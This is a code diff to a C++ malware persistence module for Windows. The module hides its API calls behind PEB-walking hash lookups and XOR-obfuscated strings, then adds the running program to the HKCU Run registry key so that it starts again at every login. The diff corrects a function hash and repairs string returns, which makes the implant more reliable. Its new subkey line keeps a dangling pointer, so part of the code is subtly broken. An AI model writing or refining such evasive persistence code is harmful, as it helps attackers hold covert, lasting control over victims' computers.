@@ -17,28 +17,27 @@ namespace persistence {
 #ifdef _WIN32
 
 // Pre-computed hashes for Registry APIs
-constexpr uint32_t HASH_ADVAPI32          = 0x67208A49;
 constexpr uint32_t FN_REGCREATEKEYEXA     = 0x46CEB39E;
 constexpr uint32_t FN_REGSETVALUEEXA      = 0x345872EA;
 constexpr uint32_t FN_REGCLOSEKEY         = 0x736B3702;
-constexpr uint32_t FN_GETMODULEFILENAMEA  = 0x13B8A14D;
+constexpr uint32_t FN_GETMODULEFILENAMEA  = 0x5973A8A6; // Corrected hash
 
 inline std::string establish_windows(const std::string& name) {
     // 1. Resolve GetModuleFileNameA to get current path
     auto pGetModuleFileNameA = (DWORD(WINAPI*)(HMODULE, LPSTR, DWORD))peb::Resolve(peb::HASH_KERNEL32, FN_GETMODULEFILENAMEA);
-    if (!pGetModuleFileNameA) return XOR_DEC(XOR_STR("Error: Failed to resolve GetModuleFileNameA")).c_str();
+    if (!pGetModuleFileNameA) return std::string(XOR_DEC(XOR_STR("Error: Failed to resolve GetModuleFileNameA")));
 
     char currentPath[MAX_PATH];
     if (pGetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0) {
-        return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
+        return std::string(XOR_DEC(XOR_STR("Error: Could not get current process path")));
     }
 
     // 2. Load Advapi32.dll for Registry functions
     auto pLoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
-    if (!pLoadLibraryA) return XOR_DEC(XOR_STR("Error: Failed to resolve LoadLibraryA")).c_str();
+    if (!pLoadLibraryA) return std::string(XOR_DEC(XOR_STR("Error: Failed to resolve LoadLibraryA")));
 
     HMODULE hAdvapi = pLoadLibraryA(XOR_DEC(XOR_STR("advapi32.dll")).c_str());
-    if (!hAdvapi) return XOR_DEC(XOR_STR("Error: Failed to load advapi32.dll")).c_str();
+    if (!hAdvapi) return std::string(XOR_DEC(XOR_STR("Error: Failed to load advapi32.dll")));
 
     // 3. Resolve Registry functions
     auto pRegCreateKeyExA = (LONG(WINAPI*)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD))peb::GetProcByHash(hAdvapi, FN_REGCREATEKEYEXA);
@@ -46,22 +45,23 @@ inline std::string establish_windows(const std::string& name) {
     auto pRegCloseKey = (LONG(WINAPI*)(HKEY))peb::GetProcByHash(hAdvapi, FN_REGCLOSEKEY);
 
     if (!pRegCreateKeyExA || !pRegSetValueExA || !pRegCloseKey) {
-        return XOR_DEC(XOR_STR("Error: Failed to resolve Registry APIs")).c_str();
+        return std::string(XOR_DEC(XOR_STR("Error: Failed to resolve Registry APIs")));
     }
 
     HKEY hKey;
-    const char* subkey = XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
+    auto enc_subkey = XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+    const char* subkey = XOR_DEC(enc_subkey).c_str();
     
     if (pRegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         if (pRegSetValueExA(hKey, name.c_str(), 0, REG_SZ, (const BYTE*)currentPath, (DWORD)strlen(currentPath) + 1) == ERROR_SUCCESS) {
             pRegCloseKey(hKey);
-            return XOR_DEC(XOR_STR("Native persistence (RunKey) established: ")).c_str() + name;
+            return std::string(XOR_DEC(XOR_STR("Native persistence (RunKey) established: "))) + name;
         }
         pRegCloseKey(hKey);
-        return XOR_DEC(XOR_STR("Error: Failed to set Registry value")).c_str();
+        return std::string(XOR_DEC(XOR_STR("Error: Failed to set Registry value")));
     }
 
-    return XOR_DEC(XOR_STR("Error: Failed to open/create Registry key")).c_str();
+    return std::string(XOR_DEC(XOR_STR("Error: Failed to open/create Registry key")));
 }
 
 #else
